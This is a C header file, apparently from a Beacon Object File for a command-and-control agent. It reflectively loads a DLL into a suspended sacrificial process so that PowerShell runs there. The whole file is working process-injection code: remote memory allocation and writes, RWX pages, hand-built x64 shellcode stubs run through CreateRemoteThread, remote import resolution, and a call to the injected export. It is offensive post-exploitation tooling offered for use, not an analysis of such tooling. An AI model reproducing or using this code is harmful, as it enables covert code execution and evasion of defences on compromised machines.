#pragma once
/*
 * Reflective-map PowerPickForkHost.dll into a suspended sacrificial process.
 *
 * Critical: import resolution uses LoadLibraryA/GetProcAddress only inside the
 * child (remote stubs). The agent must not LoadLibrary host dependencies
 * (that previously AVed / polluted the beacon).
 *
 * Order: copy sections → relocs → imports (INT from raw PE, IAT filled last) →
 * write remote → DllMain → PowerPickForkRun(mapName).
 *
 * Included into powerpick_fork.c (BOF single translation unit).
 */

#include <winnt.h>

static BOOL PpfRemoteWrite(
    HANDLE hProcess,
    LPVOID remote,
    const void* local,
    SIZE_T size)
{
    SIZE_T written = 0;
    return KERNEL32$WriteProcessMemory(
        hProcess, remote, local, size, &written) && written == size;
}

static LPVOID PpfRemoteAlloc(HANDLE hProcess, SIZE_T size, DWORD protect)
{
    return KERNEL32$VirtualAllocEx(
        hProcess,
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        protect);
}

/* Remote: result = fn(rcx, rdx); store result at outPtr. */
static BOOL PpfRemoteCall2(
    HANDLE hProcess,
    ULONG_PTR fn,
    ULONG_PTR arg0,
    ULONG_PTR arg1,
    ULONG_PTR* outResult,
    DWORD timeoutMs)
{
    BYTE stub[80];
    SIZE_T n = 0;
    LPVOID remoteOut = NULL;
    LPVOID remoteSc = NULL;
    HANDLE hThread = NULL;
    BOOL ok = FALSE;
    ULONG_PTR result = 0;
    DWORD wait;

    if (outResult) {
        *outResult = 0;
    }

    remoteOut = PpfRemoteAlloc(hProcess, sizeof(ULONG_PTR), PAGE_READWRITE);
    remoteSc = PpfRemoteAlloc(hProcess, 80, PAGE_EXECUTE_READWRITE);
    if (!remoteOut || !remoteSc) {
        goto done;
    }

    /*
     * sub rsp, 28h
     * mov rcx, arg0
     * mov rdx, arg1
     * mov rax, fn
     * call rax
     * mov rcx, remoteOut
     * mov [rcx], rax
     * add rsp, 28h
     * ret
     */
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &arg0, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xBA;
    MSVCRT$memcpy(stub + n, &arg1, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &fn, 8); n += 8;
    stub[n++] = 0xFF; stub[n++] = 0xD0;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &remoteOut, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0x89; stub[n++] = 0x01;
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
    stub[n++] = 0xC3;

    if (!PpfRemoteWrite(hProcess, remoteSc, stub, n)) {
        goto done;
    }

    hThread = KERNEL32$CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
    if (!hThread) {
        goto done;
    }
    wait = KERNEL32$WaitForSingleObject(hThread, timeoutMs);
    if (wait != WAIT_OBJECT_0) {
        goto done;
    }
    if (!KERNEL32$ReadProcessMemory(
            hProcess, remoteOut, &result, sizeof(result), NULL)) {
        goto done;
    }
    if (outResult) {
        *outResult = result;
    }
    ok = TRUE;

done:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
    }
    if (remoteSc) {
        KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
    }
    if (remoteOut) {
        KERNEL32$VirtualFreeEx(hProcess, remoteOut, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfRemoteLoadLibraryA(
    HANDLE hProcess,
    const char* name,
    ULONG_PTR* outBase)
{
    SIZE_T nameLen;
    LPVOID remoteName = NULL;
    ULONG_PTR pLoadLibraryA;
    BOOL ok = FALSE;

    if (!name || !outBase) {
        return FALSE;
    }
    *outBase = 0;

    pLoadLibraryA = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA");
    if (!pLoadLibraryA) {
        return FALSE;
    }

    nameLen = MSVCRT$strlen(name) + 1;
    remoteName = PpfRemoteAlloc(hProcess, nameLen, PAGE_READWRITE);
    if (!remoteName || !PpfRemoteWrite(hProcess, remoteName, name, nameLen)) {
        goto done;
    }

    if (!PpfRemoteCall2(
            hProcess,
            pLoadLibraryA,
            (ULONG_PTR)remoteName,
            0,
            outBase,
            15000) ||
        *outBase == 0) {
        goto done;
    }
    ok = TRUE;

done:
    if (remoteName) {
        KERNEL32$VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfRemoteGetProcAddress(
    HANDLE hProcess,
    ULONG_PTR moduleBase,
    const char* name,
    ULONG_PTR* outFn)
{
    SIZE_T nameLen;
    LPVOID remoteName = NULL;
    ULONG_PTR pGetProcAddress;
    BOOL ok = FALSE;

    if (!moduleBase || !name || !outFn) {
        return FALSE;
    }
    *outFn = 0;

    pGetProcAddress = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "GetProcAddress");
    if (!pGetProcAddress) {
        return FALSE;
    }

    nameLen = MSVCRT$strlen(name) + 1;
    remoteName = PpfRemoteAlloc(hProcess, nameLen, PAGE_READWRITE);
    if (!remoteName || !PpfRemoteWrite(hProcess, remoteName, name, nameLen)) {
        goto done;
    }

    if (!PpfRemoteCall2(
            hProcess,
            pGetProcAddress,
            moduleBase,
            (ULONG_PTR)remoteName,
            outFn,
            15000) ||
        *outFn == 0) {
        goto done;
    }
    ok = TRUE;

done:
    if (remoteName) {
        KERNEL32$VirtualFreeEx(hProcess, remoteName, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfRemoteGetProcAddressOrdinal(
    HANDLE hProcess,
    ULONG_PTR moduleBase,
    WORD ordinal,
    ULONG_PTR* outFn)
{
    ULONG_PTR pGetProcAddress;

    if (!moduleBase || !outFn) {
        return FALSE;
    }
    *outFn = 0;

    pGetProcAddress = (ULONG_PTR)KERNEL32$GetProcAddress(
        KERNEL32$GetModuleHandleA("kernel32.dll"),
        "GetProcAddress");
    if (!pGetProcAddress) {
        return FALSE;
    }

    return PpfRemoteCall2(
               hProcess,
               pGetProcAddress,
               moduleBase,
               (ULONG_PTR)ordinal,
               outFn,
               15000) &&
        *outFn != 0;
}

static DWORD PpfRvaToOffset(BYTE* pe, DWORD rva)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    WORD i;

    if (rva < nt->OptionalHeader.SizeOfHeaders) {
        return rva;
    }
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD va = sec[i].VirtualAddress;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD raw = sec[i].PointerToRawData;
        DWORD rsz = sec[i].SizeOfRawData;
        if (rva >= va && rva < va + (vsz ? vsz : rsz)) {
            return raw + (rva - va);
        }
    }
    return 0;
}

static ULONG_PTR PpfGetExportRva(BYTE* pe, const char* exportName)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY* exp;
    DWORD* names;
    WORD* ords;
    DWORD* funcs;
    DWORD i;
    DWORD off;

    if (!dir->VirtualAddress || !dir->Size) {
        return 0;
    }
    off = PpfRvaToOffset(pe, dir->VirtualAddress);
    if (!off) {
        return 0;
    }
    exp = (IMAGE_EXPORT_DIRECTORY*)(pe + off);
    names = (DWORD*)(pe + PpfRvaToOffset(pe, exp->AddressOfNames));
    ords = (WORD*)(pe + PpfRvaToOffset(pe, exp->AddressOfNameOrdinals));
    funcs = (DWORD*)(pe + PpfRvaToOffset(pe, exp->AddressOfFunctions));
    for (i = 0; i < exp->NumberOfNames; i++) {
        const char* n = (const char*)(pe + PpfRvaToOffset(pe, names[i]));
        if (MSVCRT$strncmp(n, exportName, 64) == 0) {
            return (ULONG_PTR)funcs[ords[i]];
        }
    }
    return 0;
}

/*
 * Resolve imports into local image IAT using child-only LoadLibrary/GetProc.
 * Call AFTER relocs. Read INT entries from the original file (RVAs), so reloc
 * patches on the mapped image cannot corrupt name lookups.
 */
static BOOL PpfProcessImportsRemote(
    HANDLE hProcess,
    BYTE* image,
    BYTE* rawPe,
    int rawPeLen)
{
    IMAGE_NT_HEADERS64* nt =
        (IMAGE_NT_HEADERS64*)(image + ((IMAGE_DOS_HEADER*)image)->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR* imp;

    (void)rawPeLen;
    if (!dir->VirtualAddress) {
        return TRUE;
    }

    imp = (IMAGE_IMPORT_DESCRIPTOR*)(image + dir->VirtualAddress);
    for (; imp->Name; imp++) {
        char* dllName = (char*)(image + imp->Name);
        ULONG_PTR remoteMod = 0;
        DWORD oftRva =
            imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
        DWORD ftRva = imp->FirstThunk ? imp->FirstThunk : imp->OriginalFirstThunk;
        DWORD i;

        if (!PpfRemoteLoadLibraryA(hProcess, dllName, &remoteMod)) {
            return FALSE;
        }

        for (i = 0;; i++) {
            DWORD entryOff;
            ULONG_PTR entry;
            ULONG_PTR fn = 0;
            ULONG_PTR* iatSlot;

            entryOff = PpfRvaToOffset(rawPe, oftRva + i * sizeof(ULONG_PTR));
            if (!entryOff) {
                return FALSE;
            }
            entry = *(ULONG_PTR*)(rawPe + entryOff);
            if (entry == 0) {
                break;
            }

            if (IMAGE_SNAP_BY_ORDINAL64(entry)) {
                if (!PpfRemoteGetProcAddressOrdinal(
                        hProcess,
                        remoteMod,
                        (WORD)IMAGE_ORDINAL64(entry),
                        &fn)) {
                    return FALSE;
                }
            } else {
                DWORD ibnOff = PpfRvaToOffset(rawPe, (DWORD)entry);
                IMAGE_IMPORT_BY_NAME* ibn;
                if (!ibnOff) {
                    return FALSE;
                }
                ibn = (IMAGE_IMPORT_BY_NAME*)(rawPe + ibnOff);
                if (!PpfRemoteGetProcAddress(
                        hProcess, remoteMod, (const char*)ibn->Name, &fn)) {
                    return FALSE;
                }
            }

            iatSlot = (ULONG_PTR*)(image + ftRva + i * sizeof(ULONG_PTR));
            *iatSlot = fn;
        }
    }
    return TRUE;
}

static BOOL PpfProcessRelocs(BYTE* image, ULONG_PTR remoteBase, ULONG_PTR preferred)
{
    IMAGE_NT_HEADERS64* nt =
        (IMAGE_NT_HEADERS64*)(image + ((IMAGE_DOS_HEADER*)image)->e_lfanew);
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    IMAGE_BASE_RELOCATION* reloc;
    ULONG_PTR delta;
    DWORD processed = 0;

    if (!dir->VirtualAddress || !dir->Size) {
        return TRUE;
    }
    delta = remoteBase - preferred;
    if (delta == 0) {
        return TRUE;
    }
    reloc = (IMAGE_BASE_RELOCATION*)(image + dir->VirtualAddress);
    while (processed < dir->Size && reloc->SizeOfBlock) {
        DWORD count =
            (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entry = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
        DWORD i;
        for (i = 0; i < count; i++) {
            WORD type = entry[i] >> 12;
            WORD off = entry[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONG_PTR* patch =
                    (ULONG_PTR*)(image + reloc->VirtualAddress + off);
                *patch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD* patch = (DWORD*)(image + reloc->VirtualAddress + off);
                *patch += (DWORD)delta;
            }
        }
        processed += reloc->SizeOfBlock;
        reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
    }
    return TRUE;
}

/*
 * waitMs == 0: fire-and-forget (for PowerPickForkRun, which ExitProcess's).
 * waitMs  > 0: wait for the remote thread.
 */
static BOOL PpfRemoteCall4(
    HANDLE hProcess,
    ULONG_PTR fn,
    ULONG_PTR a0,
    ULONG_PTR a1,
    ULONG_PTR a2,
    ULONG_PTR a3,
    DWORD waitMs)
{
    BYTE stub[80];
    SIZE_T n = 0;
    LPVOID remoteSc = NULL;
    HANDLE hThread = NULL;
    BOOL ok = FALSE;
    DWORD wait;

    remoteSc = PpfRemoteAlloc(hProcess, 80, PAGE_EXECUTE_READWRITE);
    if (!remoteSc) {
        return FALSE;
    }

    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xEC; stub[n++] = 0x28;
    stub[n++] = 0x48; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &a0, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xBA;
    MSVCRT$memcpy(stub + n, &a1, 8); n += 8;
    stub[n++] = 0x49; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &a2, 8); n += 8;
    stub[n++] = 0x49; stub[n++] = 0xB9;
    MSVCRT$memcpy(stub + n, &a3, 8); n += 8;
    stub[n++] = 0x48; stub[n++] = 0xB8;
    MSVCRT$memcpy(stub + n, &fn, 8); n += 8;
    stub[n++] = 0xFF; stub[n++] = 0xD0;
    stub[n++] = 0x48; stub[n++] = 0x83; stub[n++] = 0xC4; stub[n++] = 0x28;
    stub[n++] = 0xC3;

    if (!PpfRemoteWrite(hProcess, remoteSc, stub, n)) {
        goto done;
    }

    hThread = KERNEL32$CreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteSc, NULL, 0, NULL);
    if (!hThread) {
        goto done;
    }

    if (waitMs == 0) {
        /* Export runs PowerShell then ExitProcess — go() waits on the process. */
        ok = TRUE;
        goto done;
    }

    wait = KERNEL32$WaitForSingleObject(hThread, waitMs);
    ok = (wait == WAIT_OBJECT_0);

done:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
    }
    if (waitMs != 0 && remoteSc) {
        KERNEL32$VirtualFreeEx(hProcess, remoteSc, 0, MEM_RELEASE);
    }
    return ok;
}

static BOOL PpfReflectHostDll(
    HANDLE hProcess,
    const char* hostDll,
    int hostDllLen,
    const char* mapName)
{
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS64* nt;
    BYTE* localImage = NULL;
    LPVOID remoteImage = NULL;
    ULONG_PTR remoteBase = 0;
    ULONG_PTR exportRva;
    ULONG_PTR entry;
    LPVOID remoteMapName = NULL;
    SIZE_T mapNameLen;
    DWORD oldProt = 0;
    WORD i;
    BOOL ok = FALSE;

    if (!hProcess || !hostDll || hostDllLen < 0x200 || !mapName) {
        return FALSE;
    }

    dos = (IMAGE_DOS_HEADER*)hostDll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    nt = (IMAGE_NT_HEADERS64*)(hostDll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE ||
        nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return FALSE;
    }

    localImage = (BYTE*)intAlloc(nt->OptionalHeader.SizeOfImage);
    if (!localImage) {
        return FALSE;
    }
    MSVCRT$memset(localImage, 0, nt->OptionalHeader.SizeOfImage);
    MSVCRT$memcpy(localImage, hostDll, nt->OptionalHeader.SizeOfHeaders);

    {
        IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
        for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (sec[i].SizeOfRawData == 0) {
                continue;
            }
            if (sec[i].PointerToRawData + sec[i].SizeOfRawData >
                (DWORD)hostDllLen) {
                goto done;
            }
            MSVCRT$memcpy(
                localImage + sec[i].VirtualAddress,
                hostDll + sec[i].PointerToRawData,
                sec[i].SizeOfRawData);
        }
    }

    remoteImage = PpfRemoteAlloc(
        hProcess, nt->OptionalHeader.SizeOfImage, PAGE_READWRITE);
    if (!remoteImage) {
        goto done;
    }
    remoteBase = (ULONG_PTR)remoteImage;

    /* Relocs first, then imports (IAT overwritten with absolute remote addrs). */
    if (!PpfProcessRelocs(
            localImage, remoteBase, (ULONG_PTR)nt->OptionalHeader.ImageBase)) {
        goto done;
    }
    if (!PpfProcessImportsRemote(
            hProcess, localImage, (BYTE*)hostDll, hostDllLen)) {
        goto done;
    }

    if (!PpfRemoteWrite(
            hProcess, remoteImage, localImage, nt->OptionalHeader.SizeOfImage)) {
        goto done;
    }
    /* RWX for the image: MinGW CRT needs writable .data/.bss at runtime. */
    if (!KERNEL32$VirtualProtectEx(
            hProcess,
            remoteImage,
            nt->OptionalHeader.SizeOfImage,
            PAGE_EXECUTE_READWRITE,
            &oldProt)) {
        goto done;
    }

    exportRva = PpfGetExportRva((BYTE*)hostDll, "PowerPickForkRun");
    if (!exportRva) {
        goto done;
    }
    entry = remoteBase + exportRva;

    if (nt->OptionalHeader.AddressOfEntryPoint) {
        if (!PpfRemoteCall4(
                hProcess,
                remoteBase + nt->OptionalHeader.AddressOfEntryPoint,
                remoteBase,
                1, /* DLL_PROCESS_ATTACH */
                0,
                0,
                15000)) {
            goto done;
        }
    }

    mapNameLen = MSVCRT$strlen(mapName) + 1;
    remoteMapName = PpfRemoteAlloc(hProcess, mapNameLen, PAGE_READWRITE);
    if (!remoteMapName ||
        !PpfRemoteWrite(hProcess, remoteMapName, mapName, mapNameLen)) {
        goto done;
    }

    /* PowerPickForkRun(NULL, hinst, mapName, 0) — does not wait (ExitProcess). */
    if (!PpfRemoteCall4(
            hProcess,
            entry,
            0,
            remoteBase,
            (ULONG_PTR)remoteMapName,
            0,
            0)) {
        goto done;
    }

    ok = TRUE;

done:
    if (localImage) {
        intFree(localImage);
    }
    return ok;
}
